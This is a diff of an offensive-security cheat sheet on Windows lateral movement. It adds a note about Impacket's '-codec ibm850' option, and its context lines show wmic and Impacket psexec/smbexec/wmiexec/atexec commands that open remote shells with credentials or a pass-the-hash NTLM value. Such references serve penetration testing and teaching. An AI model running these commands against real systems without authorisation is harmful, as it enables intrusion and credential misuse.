@@ -219,7 +219,8 @@ PS C:\> wmic /node:target.domain /user:domain\user /password:password process ca
 ## Psexec.py / Smbexec.py / Wmiexec.py 
 
 From [Impacket](https://github.com/SecureAuthCorp/impacket) (:warning: renamed to impacket-xxx in Kali)
-:warning: `get` / `put` for wmiexec, psexec, smbexec, and dcomexec are changing to `lget` and `lput`.
+:warning: `get` / `put` for wmiexec, psexec, smbexec, and dcomexec are changing to `lget` and `lput`.    
+:warning: French characters might not be correctly displayed on your output, use `-codec ibm850` to fix this.
 
 ```powershell
 root@payload$ git clone https://github.com/CoreSecurity/impacket.git
@@ -234,7 +235,6 @@ root@payload$ python smbexec.py DOMAIN/username:password@10.10.10.10
 # A semi-interactive shell, used through Windows Management Instrumentation. 
 root@payload$ python wmiexec.py DOMAIN/username:password@10.10.10.10
 root@payload$ wmiexec.py domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79
-
 
 # A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. 
 root@payload$ python atexec.py DOMAIN/username:password@10.10.10.10
